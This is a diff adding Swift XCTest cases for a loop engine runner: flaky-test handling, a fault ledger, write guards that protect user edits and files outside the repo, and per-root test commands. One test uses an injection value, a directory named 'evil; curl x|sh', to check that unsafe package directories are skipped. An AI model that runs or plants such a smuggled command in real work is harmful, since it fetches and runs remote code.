@@ -3060,6 +3060,252 @@ final class LoopEngineRunnerTests: XCTestCase {
         return dir
     }
 
+    /// The flake gate re-runs a failed Test stage; when the re-run passes, the
+    /// ledger op must see the PASSING run, not the first run's failing output.
+    func testLedgerOpAfterFlakyTestStageOpensNoFaults() async throws {
+        let repo = try makeTempRepo()
+        var call = 0
+        let verifier = StubVerifier { _ in
+            defer { call += 1 }
+            return call == 0
+                ? VerifyOutcome(exitCode: 1, output: "/p/A.swift:7: error: -[M.C testFlaky] : XCTAssertTrue failed")
+                : VerifyOutcome(exitCode: 0, output: "Test Case '-[M.C testFlaky]' passed (0.001 seconds).")
+        }
+        let journal = InMemoryJournal()
+        let approvals = makeApprovals()
+        approvals.approveStage(repo: repo, stageId: "t1", command: "swift test")
+        let config = LoopEngineConfig(stages: [
+            LoopStage(id: "t1", name: "Test", kind: .shellCommand, command: "swift test", order: 0),
+            LoopStage(id: "l1", name: "Ledger", kind: .testMap, order: 1, testOp: .ledger),
+        ], maxIterations: 3, consecutiveFailureStop: 3)
+        let runner = makeRunner(
+            verifier: verifier, stageRepairer: StubRepairer(),
+            regressionSweep: StubRegressionSweep(alwaysPasses: true),
+            skillExecutor: StubSkillExecutor(),
+            approvals: approvals, journal: journal)
+        let result = await runner.run(config: config, faultsRoot: repo, gitRoot: repo)
+        XCTAssertEqual(result, .success)
+        let ledgerAttempt = journal.written.last?.iterations.flatMap(\.attempts).last { $0.kind == .testMap }
+        XCTAssertEqual(ledgerAttempt?.newFaults, [])
+        let faults = (try? FileManager.default.contentsOfDirectory(atPath: repo.appendingPathComponent("system/faults").path)) ?? []
+        XCTAssertTrue(faults.isEmpty)
+    }
+
+    /// A Test stage that fails and never passes must still feed the ledger: the
+    /// ledger's own position (after Test) is never reached, so the runner hands
+    /// it the failing output before the stage gives up.
+    func testLedgerRecordsFaultsFromAFailingTestStageThatNeverPasses() async throws {
+        let repo = try makeTempRepo()
+        let verifier = StubVerifier { _ in
+            VerifyOutcome(exitCode: 1, output: "/p/A.swift:7: error: -[M.C testBroken] : XCTAssertTrue failed\n"
+                          + "Test Case '-[M.C testBroken]' failed (0.001 seconds).")
+        }
+        let journal = InMemoryJournal()
+        let approvals = makeApprovals()
+        approvals.approveStage(repo: repo, stageId: "t1", command: "swift test")
+        let config = LoopEngineConfig(stages: [
+            LoopStage(id: "t1", name: "Test", kind: .shellCommand, command: "swift test", order: 0),
+            LoopStage(id: "l1", name: "Ledger", kind: .testMap, order: 1, testOp: .ledger),
+        ], maxIterations: 3, consecutiveFailureStop: 3, maxRepairsPerStage: 0)
+        let runner = makeRunner(
+            verifier: verifier, stageRepairer: StubRepairer(),
+            regressionSweep: StubRegressionSweep(alwaysPasses: true),
+            skillExecutor: StubSkillExecutor(),
+            approvals: approvals, journal: journal)
+        let result = await runner.run(config: config, faultsRoot: repo, gitRoot: repo)
+        XCTAssertNotEqual(result, .success)
+        let ledgerAttempts = journal.written.last?.iterations.flatMap(\.attempts).filter { $0.kind == .testMap } ?? []
+        XCTAssertEqual(ledgerAttempts.count, 1)
+        let ids = ledgerAttempts.first?.newFaults ?? []
+        XCTAssertEqual(ids.count, 1)
+        let dir = repo.appendingPathComponent("system/faults")
+        let files = (try? FileManager.default.contentsOfDirectory(atPath: dir.path)) ?? []
+        XCTAssertEqual(files.count, 1)
+        let text = files.first.flatMap { try? String(contentsOf: dir.appendingPathComponent($0)) } ?? ""
+        XCTAssertTrue(text.contains("test:\(ids.first ?? "?")"), text)
+    }
+
+    /// The create-only guard must not revert a file that held the user's own
+    /// uncommitted edits before the writer ran — but the stage still fails.
+    func testWriteGuardLeavesPreDirtyFileAndFails() async throws {
+        let repo = try makeTempRepo()
+        func git(_ args: String) throws {
+            let p = Process(); p.executableURL = URL(fileURLWithPath: "/bin/sh")
+            p.arguments = ["-c", "cd '\(repo.path)' && git \(args)"]
+            p.standardOutput = Pipe(); p.standardError = Pipe()
+            try p.run(); p.waitUntilExit()
+        }
+        try "one\n".write(to: repo.appendingPathComponent("A.swift"), atomically: true, encoding: .utf8)
+        try git("init -q && git add . && git -c user.email=a@b -c user.name=t commit -qm init")
+        try "user edit\n".write(to: repo.appendingPathComponent("A.swift"), atomically: true, encoding: .utf8)
+        let runner = makeRunner(
+            verifier: StubVerifier { _ in VerifyOutcome(exitCode: 0, output: "") }, stageRepairer: StubRepairer(),
+            regressionSweep: StubRegressionSweep(alwaysPasses: true), skillExecutor: StubSkillExecutor(),
+            approvals: makeApprovals(), scopeGuard: GitRepairScopeGuard())
+        runner.testStructure = TestStructure(generatedAt: Date(), roots: [
+            TestRoot(packageDir: "", testDir: "Tests", runner: .xctest, command: "swift test", namingRule: "", languages: ["swift"])
+        ], status: "ok", notes: [])
+        runner.lastGuardSnapshot = RepairScopeSnapshot(dirtyPaths: ["A.swift"], usable: true, reason: nil)
+        let writer = LoopStage(name: "Test Write", kind: .skill, order: 0, skillId: "skills/test-gap-writer")
+        let message = await runner.enforceTestWriteOnly(
+            stage: writer, result: LoopAgentResult(changedPaths: ["A.swift"]), changed: ["A.swift"], gitRoot: repo)
+        XCTAssertTrue(message?.contains("left in place: A.swift") == true, message ?? "nil")
+        XCTAssertEqual(try String(contentsOf: repo.appendingPathComponent("A.swift")), "user edit\n")
+    }
+
+    private func gitRepo(files: [String: String]) throws -> URL {
+        let repo = try makeTempRepo()
+        for (name, text) in files {
+            try text.write(to: repo.appendingPathComponent(name), atomically: true, encoding: .utf8)
+        }
+        let p = Process(); p.executableURL = URL(fileURLWithPath: "/bin/sh")
+        p.arguments = ["-c", "cd '\(repo.path)' && git init -q && git add . && git -c user.email=a@b -c user.name=t commit -qm init"]
+        p.standardOutput = Pipe(); p.standardError = Pipe()
+        try p.run(); p.waitUntilExit()
+        return repo
+    }
+
+    private func swiftStructure() -> TestStructure {
+        TestStructure(generatedAt: Date(), roots: [
+            TestRoot(packageDir: "", testDir: "Tests", runner: .xctest, command: "swift test", namingRule: "", languages: ["swift"])
+        ], status: "ok", notes: [])
+    }
+
+    /// Policy `.off` used to skip the snapshot, so the guard reverted the user's
+    /// own uncommitted edits to HEAD. With no snapshot it must revert nothing.
+    func testWriteGuardWithoutSnapshotRevertsNothingAndFails() async throws {
+        let repo = try gitRepo(files: ["A.swift": "one\n"])
+        try "user edit\n".write(to: repo.appendingPathComponent("A.swift"), atomically: true, encoding: .utf8)
+        let runner = makeRunner(
+            verifier: StubVerifier { _ in VerifyOutcome(exitCode: 0, output: "") }, stageRepairer: StubRepairer(),
+            regressionSweep: StubRegressionSweep(alwaysPasses: true), skillExecutor: StubSkillExecutor(),
+            approvals: makeApprovals(), scopeGuard: GitRepairScopeGuard())
+        runner.testStructure = swiftStructure()
+        runner.lastGuardSnapshot = nil
+        let writer = LoopStage(name: "Test Write", kind: .skill, order: 0, skillId: "skills/test-gap-writer")
+        let message = await runner.enforceTestWriteOnly(
+            stage: writer, result: LoopAgentResult(changedPaths: ["A.swift"]), changed: ["A.swift"], gitRoot: repo)
+        XCTAssertTrue(message?.contains("no snapshot") == true, message ?? "nil")
+        XCTAssertEqual(try String(contentsOf: repo.appendingPathComponent("A.swift")), "user edit\n")
+        let setup = LoopStage(name: "Test Setup", kind: .skill, order: 0, skillId: "skills/test-structure-setup")
+        try "user edit\n".write(to: repo.appendingPathComponent("package.json"), atomically: true, encoding: .utf8)
+        let setupMessage = await runner.enforceTestSetupOnly(
+            stage: setup, result: LoopAgentResult(changedPaths: ["A.swift"]), changed: ["A.swift"], gitRoot: repo)
+        XCTAssertTrue(setupMessage?.contains("no snapshot") == true, setupMessage ?? "nil")
+        XCTAssertEqual(try String(contentsOf: repo.appendingPathComponent("A.swift")), "user edit\n")
+    }
+
+    /// Under policy `.off` the writer stage still snapshots before the agent runs.
+    func testTestWriterStageSnapshotsUnderProtectedPathPolicyOff() async throws {
+        let repo = try makeTempRepo()
+        let runner = makeRunner(
+            verifier: StubVerifier { _ in VerifyOutcome(exitCode: 0, output: "") }, stageRepairer: StubRepairer(),
+            regressionSweep: StubRegressionSweep(alwaysPasses: true), skillExecutor: StubSkillExecutor(),
+            approvals: { let a = makeApprovals(); a.approveStage(repo: repo, stageId: "t1", command: "echo ok"); return a }())
+        let config = LoopEngineConfig(stages: [
+            LoopStage(id: "w1", name: "Test Write", kind: .skill, order: 0, skillId: "skills/test-gap-writer"),
+            LoopStage(id: "t1", name: "Test", kind: .shellCommand, command: "echo ok", order: 1),
+        ], maxIterations: 2, protectedPathPolicy: .off)
+        _ = await runner.run(config: config, faultsRoot: repo, gitRoot: repo)
+        XCTAssertNotNil(runner.lastGuardSnapshot)
+    }
+
+    /// A created path the server reports outside the repo is never deleted.
+    func testWriteGuardNeverDeletesACreatedPathOutsideTheRepo() async throws {
+        let parent = try makeTempRepo()
+        let repo = parent.appendingPathComponent("repo")
+        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
+        try "keep\n".write(to: repo.appendingPathComponent("A.swift"), atomically: true, encoding: .utf8)
+        let p = Process(); p.executableURL = URL(fileURLWithPath: "/bin/sh")
+        p.arguments = ["-c", "cd '\(repo.path)' && git init -q && git add . && git -c user.email=a@b -c user.name=t commit -qm init"]
+        p.standardOutput = Pipe(); p.standardError = Pipe()
+        try p.run(); p.waitUntilExit()
+        let outside = parent.appendingPathComponent("outside.swift")
+        try "precious\n".write(to: outside, atomically: true, encoding: .utf8)
+        let runner = makeRunner(
+            verifier: StubVerifier { _ in VerifyOutcome(exitCode: 0, output: "") }, stageRepairer: StubRepairer(),
+            regressionSweep: StubRegressionSweep(alwaysPasses: true), skillExecutor: StubSkillExecutor(),
+            approvals: makeApprovals(), scopeGuard: GitRepairScopeGuard())
+        runner.testStructure = swiftStructure()
+        runner.lastGuardSnapshot = RepairScopeSnapshot(dirtyPaths: [], usable: true, reason: nil)
+        let writer = LoopStage(name: "Test Write", kind: .skill, order: 0, skillId: "skills/test-gap-writer")
+        let message = await runner.enforceTestWriteOnly(
+            stage: writer, result: LoopAgentResult(changedPaths: ["../outside.swift"], createdPaths: ["../outside.swift"]),
+            changed: ["../outside.swift"], gitRoot: repo)
+        XCTAssertTrue(message?.contains("left in place: ../outside.swift") == true, message ?? "nil")
+        XCTAssertEqual(try String(contentsOf: outside), "precious\n")
+    }
+
+    private final class CreatingSkillExecutor: LoopSkillExecuting {
+        let created: [String]
+        init(created: [String]) { self.created = created }
+        func execute(skillId: String, targetPath: String?, message: String,
+                     repoRoot: URL, extraRoots: [URL], timeout: TimeInterval?) async throws -> LoopAgentResult {
+            for path in created {
+                let url = repoRoot.appendingPathComponent(path)
+                try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
+                try "def test_x(): pass\n".write(to: url, atomically: true, encoding: .utf8)
+            }
+            return LoopAgentResult(createdPaths: created)
+        }
+    }
+
+    /// The writer created a file under a root whose command differs from the Test
+    /// stage's: the Test stage must run that command too, and fail with its exit code.
+    func testTestStageAlsoRunsTheWrittenRootsCommand() async throws {
+        let repo = try makeTempRepo()
+        for (name, text) in ["package.json": "{\"scripts\":{\"test\":\"node --test tests/\"}}",
+                             "tests/a.test.mjs": "test('x',()=>{})",
+                             "sub/pytest.ini": "[pytest]\n"] {
+            let url = repo.appendingPathComponent(name)
+            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
+            try text.write(to: url, atomically: true, encoding: .utf8)
+        }
+        try FileManager.default.createDirectory(at: repo.appendingPathComponent("sub/tests"), withIntermediateDirectories: true)
+        let verifier = StubVerifier { command in
+            command == "cd sub && pytest" ? VerifyOutcome(exitCode: 3, output: "boom") : VerifyOutcome(exitCode: 0, output: "ok")
+        }
+        let approvals = makeApprovals()
+        approvals.approveStage(repo: repo, stageId: "t1", command: "echo ok")
+        let config = LoopEngineConfig(stages: [
+            LoopStage(id: "w1", name: "Test Write", kind: .skill, order: 0, skillId: "skills/test-gap-writer"),
+            LoopStage(id: "t1", name: "Test", kind: .shellCommand, command: "echo ok", order: 1),
+        ], maxIterations: 2, maxRepairsPerStage: 0)
+        let journal = InMemoryJournal()
+        let runner = makeRunner(
+            verifier: verifier, stageRepairer: StubRepairer(),
+            regressionSweep: StubRegressionSweep(alwaysPasses: true),
+            skillExecutor: CreatingSkillExecutor(created: ["sub/tests/test_x.py"]),
+            approvals: approvals, journal: journal)
+        let result = await runner.run(config: config, faultsRoot: repo, gitRoot: repo)
+        XCTAssertNotEqual(result, .success)
+        XCTAssertEqual(verifier.calls, ["echo ok", "cd sub && pytest"])
+        XCTAssertTrue(runner.lastVerifyOutputs["t1"]?.contains("--- also ran: cd sub && pytest ---") == true)
+        let attempt = journal.written.last?.iterations.flatMap(\.attempts).last { $0.stageId == "t1" }
+        XCTAssertEqual(attempt?.exitCode, 3)
+    }
+
+    func testWrittenRootCommandsSkipUnsafePackageDirs() {
+        func root(_ dir: String, _ cmd: String) -> TestRoot {
+            TestRoot(packageDir: dir, testDir: dir + "/tests", runner: .pytest, command: cmd, namingRule: "", languages: ["py"])
+        }
+        let r = LoopEngineRunner.writtenRootCommands(
+            [root("sub", "cd sub && pytest"), root("evil; curl x|sh", "cd 'evil; curl x|sh' && pytest"), root("", "npm test")],
+            excluding: "npm test")
+        XCTAssertEqual(r.commands, ["cd sub && pytest"])
+        XCTAssertEqual(r.skipped, ["evil; curl x|sh"])
+    }
+
+    func testFailureLedgerSelectionIsScopedToTheTestStage() {
+        let stages = [
+            LoopStage(id: "b", name: "Build", kind: .shellCommand, command: "make", order: 0),
+            LoopStage(id: "t", name: "Test", kind: .shellCommand, command: "make test", order: 1),
+            LoopStage(id: "l", name: "Ledger", kind: .testMap, order: 2, testOp: .ledger),
+        ]
+        XCTAssertNil(LoopEngineRunner.ledgerStage(after: "b", in: stages))
+        XCTAssertEqual(LoopEngineRunner.ledgerStage(after: "t", in: stages)?.id, "l")
+    }
+
     private func artifactConfig(severity: LoopStageSeverity = .blocking) -> LoopEngineConfig {
         LoopEngineConfig(stages: [
             LoopStage(id: "g1", name: "Generate", kind: .skill, order: 0, skillId: "skills/plan-director"),
